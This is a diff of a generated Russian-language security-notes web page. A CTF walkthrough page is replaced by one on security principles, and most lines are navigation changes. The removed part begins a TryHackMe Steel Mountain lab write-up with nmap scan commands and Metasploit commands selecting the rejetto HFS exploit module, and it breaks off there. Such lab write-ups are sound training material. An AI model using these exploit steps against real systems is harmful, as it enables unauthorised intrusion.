@@ -12,13 +12,13 @@
         <meta name="author" content="Dmitrii Ivanov">
       
       
-        <link rel="canonical" href="https://ivanovds.ru/CTF/Steel_Mountain/">
+        <link rel="canonical" href="https://ivanovds.ru/CyberSec/SecurityPrinciples/">
       
       
-        <link rel="prev" href="../Skynet/">
+        <link rel="prev" href="../Terms_and_definitions/">
       
       
-        <link rel="next" href="../tomghost/">
+        <link rel="next" href="../Cyber_Kill_Chain/">
       
       
       <link rel="icon" href="../../images/favicon.png">
@@ -26,7 +26,7 @@
     
     
       
-        <title>Steel Mountain - ivanovds.ru</title>
+        <title>Принципы обеспечения безопаности информации - ivanovds.ru</title>
       
     
     
@@ -91,7 +91,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#steel-mountain" class="md-skip">
+        <a href="#_1" class="md-skip">
           Перейти к содержанию
         </a>
       
@@ -126,7 +126,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Steel Mountain
+              Принципы обеспечения безопаности информации
             
           </span>
         </div>
@@ -237,11 +237,13 @@
         
   
   
+    
+  
   
     
     
-      <li class="md-tabs__item">
-        <a href="../../CyberSec/" class="md-tabs__link">
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../" class="md-tabs__link">
           
   
     
@@ -257,13 +259,11 @@
         
   
   
-    
-  
   
     
     
-      <li class="md-tabs__item md-tabs__item--active">
-        <a href="../" class="md-tabs__link">
+      <li class="md-tabs__item">
+        <a href="../../CTF/" class="md-tabs__link">
           
   
     
@@ -489,6 +489,8 @@
       
   
   
+    
+  
   
     
     
@@ -532,17 +534,17 @@
       
       
     
-    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
         
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../CyberSec/" class="md-nav__link ">
+            <a href="../" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -559,7 +561,7 @@
             
           </div>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_2">
             <span class="md-nav__icon md-icon"></span>
             CyberSec
@@ -574,7 +576,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Terms_and_definitions/" class="md-nav__link">
+      <a href="../Terms_and_definitions/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -592,9 +594,29 @@
                 
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../../CyberSec/SecurityPrinciples/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Принципы обеспечения безопаности информации
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -603,6 +625,184 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Содержание">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Содержание
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#cia" class="md-nav__link">
+    Триада CIA и её коллеги.
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    Модели безопасности.
+  </a>
+  
+    <nav class="md-nav" aria-label="Модели безопасности.">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    Модель Белла Лапатулы
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    Модель Биба
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    Эшелонированная защита
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#isoiec-192492017" class="md-nav__link">
+    ISO/IEC 19249:2017
+  </a>
+  
+    <nav class="md-nav" aria-label="ISO/IEC 19249:2017">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    Разделение на домены.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    Использоваие многоуровневой архитектуры.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    Инкапсуляция.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    Отказоустойчивость.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    Виртуализация.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    Принцип наименьших привилегий.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    Принцип минимизации поверхности атаки.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    Принцип централизованной проверки параметров.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    Принцип централизованных общих сервисов безопасности.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    Подготовка к обработке ошибок и исключений.
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    Доверие и безопасность.
+  </a>
+  
+    <nav class="md-nav" aria-label="Доверие и безопасность.">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#trust-but-verify" class="md-nav__link">
+    Trust but Verify.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zero-trust" class="md-nav__link">
+    Zero Trust.
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    Уязвимость. Угроза. Риск.
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -614,7 +814,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Cyber_Kill_Chain/" class="md-nav__link">
+      <a href="../Cyber_Kill_Chain/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -634,7 +834,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Threat_modeling/" class="md-nav__link">
+      <a href="../Threat_modeling/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -654,7 +854,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/vulnerabilities/" class="md-nav__link">
+      <a href="../vulnerabilities/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -674,7 +874,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/CyberSec_specialists/" class="md-nav__link">
+      <a href="../CyberSec_specialists/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -694,7 +894,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Security_Operation_Center_%28SOC%29/" class="md-nav__link">
+      <a href="../Security_Operation_Center_%28SOC%29/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -714,7 +914,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Useful_Information/" class="md-nav__link">
+      <a href="../Useful_Information/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -734,7 +934,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Useful_Links/" class="md-nav__link">
+      <a href="../Useful_Links/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -780,7 +980,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../CyberSec/CyberSec_Frameworks/" class="md-nav__link ">
+            <a href="../CyberSec_Frameworks/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -812,7 +1012,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/CyberSec_Frameworks/nist/" class="md-nav__link">
+      <a href="../CyberSec_Frameworks/nist/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -832,7 +1032,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/CyberSec_Frameworks/GRC/" class="md-nav__link">
+      <a href="../CyberSec_Frameworks/GRC/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -896,7 +1096,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../CyberSec/CyberSec_Frameworks/OWASP/" class="md-nav__link ">
+            <a href="../CyberSec_Frameworks/OWASP/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -928,7 +1128,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/CyberSec_Frameworks/OWASP/Broken_Access_Control/" class="md-nav__link">
+      <a href="../CyberSec_Frameworks/OWASP/Broken_Access_Control/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -948,7 +1148,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/CyberSec_Frameworks/OWASP/Cryptographic_failures/" class="md-nav__link">
+      <a href="../CyberSec_Frameworks/OWASP/Cryptographic_failures/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -968,7 +1168,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/CyberSec_Frameworks/OWASP/Injection/" class="md-nav__link">
+      <a href="../CyberSec_Frameworks/OWASP/Injection/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -988,7 +1188,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/CyberSec_Frameworks/OWASP/SQLi/" class="md-nav__link">
+      <a href="../CyberSec_Frameworks/OWASP/SQLi/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1008,7 +1208,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/CyberSec_Frameworks/OWASP/XSS/" class="md-nav__link">
+      <a href="../CyberSec_Frameworks/OWASP/XSS/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1028,7 +1228,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/CyberSec_Frameworks/OWASP/insecure_design/" class="md-nav__link">
+      <a href="../CyberSec_Frameworks/OWASP/insecure_design/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1048,7 +1248,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/CyberSec_Frameworks/OWASP/Security_Misconfiguration/" class="md-nav__link">
+      <a href="../CyberSec_Frameworks/OWASP/Security_Misconfiguration/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1068,7 +1268,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/CyberSec_Frameworks/OWASP/Broken_Authentication/" class="md-nav__link">
+      <a href="../CyberSec_Frameworks/OWASP/Broken_Authentication/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1088,7 +1288,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/CyberSec_Frameworks/OWASP/Insecure_Deserialization/" class="md-nav__link">
+      <a href="../CyberSec_Frameworks/OWASP/Insecure_Deserialization/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1108,7 +1308,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/CyberSec_Frameworks/OWASP/SSRF/" class="md-nav__link">
+      <a href="../CyberSec_Frameworks/OWASP/SSRF/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1128,7 +1328,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/CyberSec_Frameworks/OWASP/logging_and_monitoring/" class="md-nav__link">
+      <a href="../CyberSec_Frameworks/OWASP/logging_and_monitoring/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1148,7 +1348,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/CyberSec_Frameworks/OWASP/XML_External_Entity_%28Security_misconfiguration%29/" class="md-nav__link">
+      <a href="../CyberSec_Frameworks/OWASP/XML_External_Entity_%28Security_misconfiguration%29/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1210,7 +1410,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../CyberSec/Penetration_testing/" class="md-nav__link ">
+            <a href="../Penetration_testing/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -1242,7 +1442,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Penetration_testing/Privilege_escalation/" class="md-nav__link">
+      <a href="../Penetration_testing/Privilege_escalation/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1262,7 +1462,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Penetration_testing/Reverse_shell/" class="md-nav__link">
+      <a href="../Penetration_testing/Reverse_shell/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1282,7 +1482,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Penetration_testing/Upload_payload/" class="md-nav__link">
+      <a href="../Penetration_testing/Upload_payload/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1332,7 +1532,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../CyberSec/web_applications/" class="md-nav__link ">
+            <a href="../web_applications/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -1364,7 +1564,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/web_applications/web_vulns/" class="md-nav__link">
+      <a href="../web_applications/web_vulns/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1444,7 +1644,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../CyberSec/Tools/" class="md-nav__link ">
+            <a href="../Tools/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -1476,7 +1676,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Tools/Burp_Suite/" class="md-nav__link">
+      <a href="../Tools/Burp_Suite/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1496,7 +1696,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Tools/curl/" class="md-nav__link">
+      <a href="../Tools/curl/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1516,7 +1716,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Tools/feroxbuster/" class="md-nav__link">
+      <a href="../Tools/feroxbuster/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1536,7 +1736,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Tools/ffuf/" class="md-nav__link">
+      <a href="../Tools/ffuf/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1556,7 +1756,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Tools/gobuster/" class="md-nav__link">
+      <a href="../Tools/gobuster/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1576,7 +1776,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Tools/hash-id/" class="md-nav__link">
+      <a href="../Tools/hash-id/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1596,7 +1796,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Tools/Hydra/" class="md-nav__link">
+      <a href="../Tools/Hydra/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1616,7 +1816,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Tools/John_the_ripper/" class="md-nav__link">
+      <a href="../Tools/John_the_ripper/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1636,7 +1836,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Tools/Metasploit/" class="md-nav__link">
+      <a href="../Tools/Metasploit/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1656,7 +1856,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Tools/netcat_nc/" class="md-nav__link">
+      <a href="../Tools/netcat_nc/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1676,7 +1876,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Tools/nikto/" class="md-nav__link">
+      <a href="../Tools/nikto/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1696,7 +1896,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Tools/nmap/" class="md-nav__link">
+      <a href="../Tools/nmap/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1716,7 +1916,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Tools/rubeus/" class="md-nav__link">
+      <a href="../Tools/rubeus/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1736,7 +1936,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Tools/socat/" class="md-nav__link">
+      <a href="../Tools/socat/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1756,7 +1956,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Tools/wireshark/" class="md-nav__link">
+      <a href="../Tools/wireshark/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1776,7 +1976,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Tools/WPScan/" class="md-nav__link">
+      <a href="../Tools/WPScan/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1826,7 +2026,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../CyberSec/Network_security/" class="md-nav__link ">
+            <a href="../Network_security/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -1858,7 +2058,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CyberSec/Network_security/ARP_spoofing/" class="md-nav__link">
+      <a href="../Network_security/ARP_spoofing/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1891,8 +2091,6 @@
       
   
   
-    
-  
   
     
     
@@ -1936,17 +2134,17 @@
       
       
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
         
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../" class="md-nav__link ">
+            <a href="../../CTF/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -1963,7 +2161,7 @@
             
           </div>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_3">
             <span class="md-nav__icon md-icon"></span>
             CTF
@@ -1978,7 +2176,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../agent_sudo/" class="md-nav__link">
+      <a href="../../CTF/agent_sudo/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1998,7 +2196,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bounty_hacker/" class="md-nav__link">
+      <a href="../../CTF/bounty_hacker/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2018,7 +2216,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../attacktive_directory/" class="md-nav__link">
+      <a href="../../CTF/attacktive_directory/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2038,7 +2236,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Basic_Pentesting/" class="md-nav__link">
+      <a href="../../CTF/Basic_Pentesting/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2058,7 +2256,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Kenoby/" class="md-nav__link">
+      <a href="../../CTF/Kenoby/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2078,7 +2276,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Lazy_admin/" class="md-nav__link">
+      <a href="../../CTF/Lazy_admin/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2098,7 +2296,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../MrRobot/" class="md-nav__link">
+      <a href="../../CTF/MrRobot/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2118,7 +2316,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Pickle_Rick/" class="md-nav__link">
+      <a href="../../CTF/Pickle_Rick/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2138,7 +2336,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../root_me/" class="md-nav__link">
+      <a href="../../CTF/root_me/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2158,7 +2356,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Simple_CTF/" class="md-nav__link">
+      <a href="../../CTF/Simple_CTF/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2178,7 +2376,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Skynet/" class="md-nav__link">
+      <a href="../../CTF/Skynet/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2196,29 +2394,9 @@
                 
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  <span class="md-ellipsis">
-    Steel Mountain
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../CTF/Steel_Mountain/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2227,47 +2405,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Содержание">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Содержание
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    Разведка и сканирование
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#metasploit" class="md-nav__link">
-    Используем metasploit
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#metasploit_1" class="md-nav__link">
-    Без использования metasploit
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -2279,7 +2416,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../tomghost/" class="md-nav__link">
+      <a href="../../CTF/tomghost/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2299,7 +2436,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Upload_Vulnerabilities/" class="md-nav__link">
+      <a href="../../CTF/Upload_Vulnerabilities/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3359,22 +3496,159 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    Разведка и сканирование
+  <a href="#cia" class="md-nav__link">
+    Триада CIA и её коллеги.
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#metasploit" class="md-nav__link">
-    Используем metasploit
+  <a href="#_2" class="md-nav__link">
+    Модели безопасности.
+  </a>
+  
+    <nav class="md-nav" aria-label="Модели безопасности.">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    Модель Белла Лапатулы
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    Модель Биба
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    Эшелонированная защита
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#metasploit_1" class="md-nav__link">
-    Без использования metasploit
+  <a href="#isoiec-192492017" class="md-nav__link">
+    ISO/IEC 19249:2017
+  </a>
+  
+    <nav class="md-nav" aria-label="ISO/IEC 19249:2017">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    Разделение на домены.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    Использоваие многоуровневой архитектуры.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    Инкапсуляция.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    Отказоустойчивость.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    Виртуализация.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    Принцип наименьших привилегий.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    Принцип минимизации поверхности атаки.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    Принцип централизованной проверки параметров.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    Принцип централизованных общих сервисов безопасности.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    Подготовка к обработке ошибок и исключений.
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    Доверие и безопасность.
+  </a>
+  
+    <nav class="md-nav" aria-label="Доверие и безопасность.">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#trust-but-verify" class="md-nav__link">
+    Trust but Verify.
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zero-trust" class="md-nav__link">
+    Zero Trust.
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    Уязвимость. Угроза. Риск.
   </a>
   
 </li>
@@ -3394,75 +3668,123 @@
                   
 
 
-<h1 id="steel-mountain">Steel Mountain</h1>
-<hr />
-<p>Основная задача - внедрение в Windows машину через <a href="/CyberSec/Tools/Metasploit.md">metasploit</a> и без него. Использование скриптов для поиска возможности эскалации привилегий Windows, эскалация привилегий в Windows.<br />
-Описание задания можно найти на <a href="https://tryhackme.com/room/steelmountain">TryHackme</a></p>
-<h3 id="_1">Разведка и сканирование</h3>
-<p>Смотрим source сайта.  </p>
-<blockquote>
-<p>Находим первый флаг - имя файла с лучшим работником.<br />
-На 8080 порту админка HFS - <a href="https://www.rejetto.com/hfs/">Http file server</a></p>
-</blockquote>
-<p>Проведение разведки с nmap на предмет наличия открытых портов:</p>
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-T4<span class="w"> </span>-p-<span class="w"> </span>IP-ADDRESS
-</span></code></pre></div>
-<blockquote>
-<p>Обнаружены открытые порты 135,80,445,3389,8080,139,49155,47001,5985,49169,49156,49154,49153,49168 </p>
-</blockquote>
-<p>Сканируем со стандартными скриптами для определения версий сервисов, ПО и прочей информации:
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-A<span class="w"> </span><span class="m">135</span>,80,445,3389,8080,139,49155,47001,5985,49169,49156,49154,49153,49168<span class="w"> </span><span class="nv">$IP</span>-ADDRESS
-</span></code></pre></div></p>
-<blockquote>
-<p>Получаем сведения о версии HFS. В случае атаки без использования <code>metasploit</code> ищем на exploit-db эксплойт для имеющейся версии rejetto HFS. </p>
-</blockquote>
-<h3 id="metasploit">Используем metasploit</h3>
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>msfconsole<span class="w"> </span>search<span class="w"> </span>hfs<span class="w"> </span><span class="c1"># Ищем в metasploit эксплойт по ключевому слову - названию сервера  </span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>use<span class="w"> </span>exploit/windows/http/rejetto_hfs_exec<span class="w"> </span><span class="c1"># Выбираем нужный эксплойт  </span>
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span>and<span class="w"> </span>RPORT<span class="w"> </span><span class="c1"># Определяем необходимые переменные  </span>
